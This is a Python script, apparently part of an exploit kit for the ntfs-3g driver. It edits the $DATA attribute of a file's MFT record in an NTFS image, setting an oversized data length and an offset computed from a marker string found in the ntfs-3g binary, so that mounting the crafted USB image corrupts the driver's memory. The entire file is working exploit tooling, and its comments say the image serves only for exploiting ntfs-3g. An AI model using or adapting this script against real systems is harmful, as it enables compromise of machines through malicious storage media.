import argparse
import struct

text_just = 38
indent = 0
mft_size = 1024
TARGET_FILE_POS = 0x9000

def label(text, value, quote=False):
    if quote:
        print("    "*indent + f"\033[33m{text}:\033[0m".ljust(text_just), f"\"{value}\"")
    else:
        print("    "*indent + f"\033[33m{text}:\033[0m".ljust(text_just), f"{value}")

def error(msg):
    print(f"\033[31mERROR:\033[0m {msg}")
    exit(1)

class Data_meta:
    def __init__(self, size, offset):
        self.size = size
        self.offset = offset

def get_file_mft_offset(fl, target_name):
    # Find the offset on the pratition the the file's mft specified
    # using target_name
    # This isn't very versatile, but we want to prepare a partition that
    # will only be used exploiting ntfs-3g, not write a whole ntfs
    # driver in python, so this should be good enough
    pos = 0

    fl.seek(pos)
    while (mft := fl.read(mft_size)) != b"":
        magic = mft[:4]
        if magic != b"FILE":
            pos += mft_size
            fl.seek(pos)
            continue

        mft_name = mft[0xda:]
        mft_name = mft_name[:mft_name.find(b"\0\0")+1]
        mft_name = mft_name.decode("UTF-16", errors="ignore")

        if mft_name == target_name:
            return pos

        pos += mft_size
        fl.seek(pos)

    return None

# Functions to get/set the size and offset in the $DATA attribute
# It's not versatile but again, this should be enough

def get_data_meta(fl, mft_offset):
    fl.seek(mft_offset)
    mft = fl.read(mft_size)
    data_size, data_offset = struct.unpack("<IH", mft[0x160:0x160+6])
    return Data_meta(data_size, data_offset)

def set_data_meta(fl, mft_offset, data_meta):
    fl.seek(mft_offset + 0x160)
    data_meta_raw = struct.pack("<IH", data_meta.size, data_meta.offset)
    fl.write(data_meta_raw)

def main():
    parser = argparse.ArgumentParser(
            prog="ntfs_edit_offset",
            description="Edit data offset and size in the provided image file. "
                        "When providing just the image the offset is set to 0. "
                        "If you also provide ntfs-3g and ident the offset will "
                        "be calculated based on those parameters")
    parser.add_argument("image",
                        help="Location of the ntfs image file, generate it "
                             "using create_image.sh")
    parser.add_argument("--ntfs-3g",
                        help="Location of ntfs-3g binary used for calculating "
                             "the offset, you probably want to use the one "
                             "provided with this repo")
    parser.add_argument("--ident",
                        help="Hex string used to identify the current "
                             "location in memory, get it using read.c")
    args = parser.parse_args()

    image = open(args.image, "rb+")
    file_to_alter_name = "file"

    file_mft_offset = get_file_mft_offset(image, file_to_alter_name)
    if file_mft_offset == -1:
        error(f"Couldn't find file named {file_to_alter_name} on the ntfs partition!")
    label("File MFT offset in image", hex(file_mft_offset))

    print()

    data_meta = get_data_meta(image, file_mft_offset)
    label("Original data size", hex(data_meta.size))
    label("Original data offset", hex(data_meta.offset))

    print()

    data_meta.size = 0xffff0860

    if args.ident:
        if not args.ntfs_3g:
            error("--ident requires --ntfs_3g")

        with open(args.ntfs_3g, "rb") as fl:
            ntfs_3g = fl.read()
        ident = bytes.fromhex(args.ident)

        ident_pos = ntfs_3g.find(ident)
        if ident_pos == -1:
            error("Couldn't find the specified ident string in ntfs-3g!")
        label("Ident position", hex(ident_pos))

        new_offset = TARGET_FILE_POS - ident_pos
        if new_offset >= 0:
            data_meta.offset = new_offset
        else:
            error(f"ident_pos ({ident_pos}) < TARGET_FILE_POS ({TARGET_FILE_POS})!\n"
                  "Heap offset probably changed between tries. Either unplug and plug\n"
                  "again the usb stick or create a new image")

        print()
    else:
        data_meta.offset = 0

    label("New data size", hex(data_meta.size))
    label("New data offset", hex(data_meta.offset))
    set_data_meta(image, file_mft_offset, data_meta)

    image.close()


if __name__ == "__main__":
    main()
